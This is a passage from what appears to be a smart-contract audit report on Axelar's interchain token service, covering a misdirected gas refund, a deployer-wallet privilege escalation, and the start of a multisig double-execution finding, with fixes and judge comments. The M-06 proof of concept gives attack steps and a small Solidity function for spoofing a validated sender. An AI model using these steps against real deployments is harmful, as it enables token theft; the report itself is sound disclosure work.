href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token/InterchainToken.sol#L104\">tokenManager.transmitInterchainTransfer</a>;</li>\n<li><code>tokenManager.transmitInterchainTransfer</code> calls <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/TokenManager.sol#L145\">interchainTokenService.transmitSendToken</a>;</li>\n<li><code>interchainTokenService.transmitSendToken</code> calls <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L513\">_callContract</a>;</li>\n<li><code>_callContract</code> uses the <code>msg.value</code> to <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L716\">pay the extra gas fees</a>.</li>\n</ol>\n<p>Notice that the <code>gasService.payNativeGasForContractCall</code> call in <code>_callContract</code> takes the <code>refundTo</code> address, i.e. the address that will receive refunded gas fee. If we return up on the call stack, we’ll see that the refund address is the sender address that’s <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token/InterchainToken.sol#L104\">passed to the <code>tokenManager.transmitInterchainTransfer</code> call</a>. Thus, the gas fees will be refunded to the token owner, not the caller; however, it’s the caller who pays them.</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>TokenManager.transmitInterchainTransfer</code> and the <code>InterchainTokenService.transmitSendToken</code> functions, besides taking the <code>sender</code>/<code>sourceAddress</code> argument, need to also take the “refund to” address. In the <code>InterchainToken.interchainTransferFrom</code> function, the two arguments will be set to different addresses: the <code>sender</code>/<code>sourceAddress</code> argument will be set to the token owner address; the new “refund to” argument will be set to <code>msg.sender</code>. Thus, while tokens will be taken from their owner, the cross-chain gas fees will be refunded to the actual transaction sender.</p>\n<h3 id=\"assessed-type-4\" style=\"position:relative;\"><a href=\"#assessed-type-4\" aria-label=\"assessed type 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>ETH-Transfer</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/316#issuecomment-1693752370\">deanamiel (Axelar) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Corrected Severity: QA</p>\n<p>In most cases, it will have been called by the sender anyway, so having the sender be refunded is the desired effect. Sometimes this will not be the case though, depending on the use case. Therefore, we have added a parameter to keep track of where the funds need to be refunded.</p>\n<p>Link to public PR: <a href=\"https://github.com/axelarnetwork/interchain-token-service/pull/96\">https://github.com/axelarnetwork/interchain-token-service/pull/96</a></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/316#issuecomment-1702538812\">berndartmueller (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Considering this medium severity as per:</p>\n<blockquote>\n<p>“…In most cases it will have been called by the sender anyway” (sponsors statement above).</p>\n</blockquote>\n<p>Nevertheless, in the cases where an approved address transfers the tokens, the gas is incorrectly refunded.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/316#issuecomment-1801781480\">milapsheth (Axelar) commented</a>:</strong></p>\n<blockquote>\n<p>We acknowledge the severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-06-deployer-wallet-retains-ability-to-spoof-validated-senders-after-ownership-transfer\" style=\"position:relative;\"><a href=\"#m-06-deployer-wallet-retains-ability-to-spoof-validated-senders-after-ownership-transfer\" aria-label=\"m 06 deployer wallet retains ability to spoof validated senders after ownership transfer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/267\">[M-06] Deployer wallet retains ability to spoof validated senders after ownership transfer</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/267\">pcarranzav</a>, also found by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/348\">immeas</a></em></p>\n<h3 id=\"lines-of-code-3\" style=\"position:relative;\"><a href=\"#lines-of-code-3\" aria-label=\"lines of code 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/9f642fe854eb11ad9f18fe028e5a8353c258e926/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L72-L74\">https://github.com/code-423n4/2023-07-axelar/blob/9f642fe854eb11ad9f18fe028e5a8353c258e926/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L72-L74</a><br>\n<a href=\"https://github.com/code-423n4/2023-07-axelar/blob/9f642fe854eb11ad9f18fe028e5a8353c258e926/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L83\">https://github.com/code-423n4/2023-07-axelar/blob/9f642fe854eb11ad9f18fe028e5a8353c258e926/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L83</a></p>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The InterchainTokenService is deployed using <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/9f642fe854eb11ad9f18fe028e5a8353c258e926/scripts/deploy.js#L60-L64\">create3</a>. This means, that its address depends on the address of the deployer wallet, the address of the <code>Create3Deployer</code> contract, and the salt that is extracted from a deployment key.</p>\n<p>It should be feasible for the same deployer wallet to deploy a <code>Create3Deployer</code> with the same address on a new chain and use the same deployment key to deploy a contract with the same address as the <code>InterchainTokenService</code>, but with arbitrary implementation. A team member has confirmed on Discord that “the address will be the <code>interchainTokenServiceAddress</code> which is constant across EVM chains.”. However, at deployment time, only a subset of all the possible EVM chains will be supported, and more may be added in the future. When that happens, it is possible that the original deployer wallet is compromised or no longer available.</p>\n<p>On the other hand, the <code>addTrustedAddress</code> function validates that the sender is the owner of the <code>RemoteAddressValidator</code> contract. This owner is originally the deployer wallet, but ownership may be transferred (and it would be a good practice to transfer it to a more secure governance multisig immediately after deployment). After ownership transfer, the previous owner should not be allowed to add trusted addresses.</p>\n<p>However, the <code>validateSender</code> function will treat any address that is the same as the current chain’s <code>InterchainTokenService</code> as valid. A malicious contract deployed by the deployer wallet after the ownership transfer could be treated as valid and would have the ability to deploy token managers and standardized tokens, or perform arbitrary token transfers. This is a form of centralization risk but is also a serious privilege escalation, as it should be possible to strip the deployer of the ability to perform these actions. This gives them virtually unlimited power even after an ownership transfer.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li>A deployer account is used to deploy all contracts on chain A.</li>\n<li>Ownership of the <code>RemoteAddressValidator</code> and all other contracts is transferred to governance multisigs. After this point, the deployer should have no ability to add trusted addresses.</li>\n<li>The deployer account is compromised (which is easier to do than compromising a governance multisig), or a team member with access to the deployer account becomes compromised or malicious.</li>\n<li>The deployer repeats the same steps used for the deployment, starting from the same wallet nonce on chain B, but replaces the <code>InterchainTokenService</code> contract with a contract that allows arbitrary messages, e.g. by adding this function to a regular <code>InterchainTokenService</code>:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        function callContract(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            string calldata destinationChain,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            bytes memory payload,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint256 gasValue,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            address refundTo</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ) external onlyOwner {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _callContract(destinationChain, payload, gasValue, refundTo);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span></code></pre>\n<ul>\n<li>The deployer then uses this contract to send a payload with <code>SELECTOR_SEND_TOKEN</code> and using the deployer address as destination to the <code>InterchainTokenService</code> on chain A.</li>\n<li>When running <code>validateSender</code> on the <code>RemoteAddressValidator</code> on chain A, this check will pass and the address will be treated as valid:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (sourceAddressHash == interchainTokenServiceAddressHash) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                return true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span></code></pre>\n<p>Therefore, the tokens will be transferred to the deployer address on chain A.</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The assumption that the <code>InterchainTokenService</code> address is valid in any chain is dangerous because of how the contract is created and the possibility that new EVM chains may exist in the future. A deployer EOA should not have this amount of permission for an indefinite time. I would recommend breaking that assumption and requiring that all addresses are added as trusted addresses explicitly.</p>\n<p>A check can therefore be added to only treat the interchain token service’s address as valid if the source chain is also the same chain where the <code>RemoteAddressValidator</code> is deployed. The following diff shows a way to do this:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/its/remote-address-validator/RemoteAddressValidator.sol b/contracts/its/remote-address-validator/RemoteAddressValidator.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index bb101e5..c2e5382 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/its/remote-address-validator/RemoteAddressValidator.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/its/remote-address-validator/RemoteAddressValidator.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -4,6 +4,7 @@ pragma solidity ^0.8.0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { IRemoteAddressValidator } from &#39;../interfaces/IRemoteAddressValidator.sol&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { AddressToString } from &#39;../../gmp-sdk/util/AddressString.sol&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { Upgradable } from &#39;../../gmp-sdk/upgradable/Upgradable.sol&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+import { StringToBytes32 } from &#39;../../gmp-sdk/util/Bytes32String.sol&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> /**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  * @title RemoteAddressValidator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -11,23 +12,25 @@ import { Upgradable } from &#39;../../gmp-sdk/upgradable/Upgradable.sol&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> contract RemoteAddressValidator is IRemoteAddressValidator, Upgradable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     using AddressToString for address;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    using StringToBytes32 for string;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     mapping(string =&gt; bytes32) public remoteAddressHashes;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     mapping(string =&gt; string) public remoteAddresses;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address public immutable interchainTokenServiceAddress;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     bytes32 public immutable interchainTokenServiceAddressHash;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     mapping(string =&gt; bool) public supportedByGateway;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    bytes32 public immutable currentChainName;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     bytes32 private constant CONTRACT_ID = keccak256(&#39;remote-address-validator&#39;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      * @dev Constructs the RemoteAddressValidator contract, both array parameters must be equal in length</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      * @param _interchainTokenServiceAddress Address of the interchain token service</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    constructor(address _interchainTokenServiceAddress) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    constructor(address _interchainTokenServiceAddress, string memory _chainName) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (_interchainTokenServiceAddress == address(0)) revert ZeroAddress();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         interchainTokenServiceAddress = _interchainTokenServiceAddress;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         interchainTokenServiceAddressHash = keccak256(bytes(_lowerCase(interchainTokenServiceAddress.toString())));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        currentChainName = _chainName.toBytes32();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -69,7 +72,7 @@ contract RemoteAddressValidator is IRemoteAddressValidator, Upgradable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function validateSender(string calldata sourceChain, string calldata sourceAddress) external view returns (bool) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         string memory sourceAddressLC = _lowerCase(sourceAddress);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         bytes32 sourceAddressHash = keccak256(bytes(sourceAddressLC));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (sourceAddressHash == interchainTokenServiceAddressHash) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (sourceAddressHash == interchainTokenServiceAddressHash &amp;&amp; sourceChain.toBytes32() == currentChainName) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             return true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         return sourceAddressHash == remoteAddressHashes[sourceChain];</span></span></span></code></pre>\n<h3 id=\"assessed-type-5\" style=\"position:relative;\"><a href=\"#assessed-type-5\" aria-label=\"assessed type 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Access Control</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/267#issuecomment-1712132762\">pcarranzav (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@berndartmueller - I’d like to point out this one, which was marked as duplicate of <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/348\">Issue 348</a> which is marked as invalid.\nThe argumentation in my submission is different, as it is framed as a privilege escalation of the deployer wallet, which persists after ownership transfer and in the hypothetical of a new EVM chain being added to the Axelar network.</p>\n<p>This modifies the trust assumptions of the protocol, as users can reasonably expect to trust the multisig Owner, but not a deployer EOA, for an indefinite time. In the closed issue, @deanamiel commented “It would be impossible to deploy a different contract at this address because the address will depend on the deployer address and salt.” However, there is a different level of “impossible” when comparing an EOA to a multisig and users now need to trust that nobody with access to that EOA is compromised or that it is disposed of properly.</p>\n<p>The probability of this being exploited is low (requires deployer EOA compromise and new chain added to the network), but the impact would be <em>huge</em>, which is why I honestly believe it warrants a Medium severity and is a valid finding to surface in the report so that users are aware.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/267#issuecomment-1713738431\">berndartmueller (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@pcarranzav - thanks for pointing this out! I’ve marked your submission as the primary report due to pointing out the deployer privilege escalation. But I also consider #348 a duplicate, as the recommended fix would also fix the underlying issue.</p>\n<p>Overall, I agree with the outlined privilege escalation. Even though the likelihood of this to happen is low, the impact would be critical. Thus, I consider medium severity to be appropriate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/267#issuecomment-1716452626\">deanamiel (Axelar) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>We acknowledge the severity, and while we’ve considered using a deployer multisig contract which reduces this risk, our operations team is planning on whitelisting explicitly to minimize the impact of the deployer or a non-whitelisted chain being compromised. Note that <code>RemoteAddressValidator</code> is deployed on the destination chain, so the recommendation to compare the source chain to the chain in remote address validator won’t work.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-07-multisig-can-execute-the-same-proposal-repeatedly\" style=\"position:relative;\"><a href=\"#m-07-multisig-can-execute-the-same-proposal-repeatedly\" aria-label=\"m 07 multisig can execute the same proposal repeatedly permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/116\">[M-07] Multisig can execute the same proposal repeatedly</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/116\">pcarranzav</a>, also found by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/333\">immeas</a></em></p>\n<h3 id=\"lines-of-code-4\" style=\"position:relative;\"><a href=\"#lines-of-code-4\" aria-label=\"lines of code 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/aeabaa7086eb35e8614e58b42f0d50728e023881/contracts/cgp/auth/MultisigBase.sol#L44-L77\">https://github.com/code-423n4/2023-07-axelar/blob/aeabaa7086eb35e8614e58b42f0d50728e023881/contracts/cgp/auth/MultisigBase.sol#L44-L77</a><br>\n<a href=\"https://github.com/code-423n4/2023-07-axelar/blob/9f642fe854eb11ad9f18fe028e5a8353c258e926/contracts/cgp/governance/Multisig.sol#L30-L36\">https://github.com/code-423n4/2023-07-axelar/blob/9f642fe854eb11ad9f18fe028e5a8353c258e926/contracts/cgp/governance/Multisig.sol#L30-L36</a></p>\n<h3 id=\"impact-4\" style=\"position:relative;\"><a href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>In MultisigBase and its use in Multisig, the <code>onlySigners</code> modifier will reset the vote count and execute the external call when the vote threshold is met. This means that if many signers send their transactions during the same block, the votes that are executed after the call execution will start a new tally, potentially re-executing the same external call if the votes are enough to meet the threshold again. This is probably low-likelihood for multisigs where the threshold is high relative to the number of signers, but could be quite likely if the threshold is relatively low.</p>\n<p>In the general case, users of Multisig may not be aware of this behavior and have no good way of avoiding this other than off-chain coordination. An accidental double execution could easily lead to a loss of funds.</p>\n<p>This doesn’t affect <code>AxelarServiceGovernance</code> because of the additional requirement of an interchain message, but it might still leave behind unwanted votes; which reduces the overall security of the governance mechanism.</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor 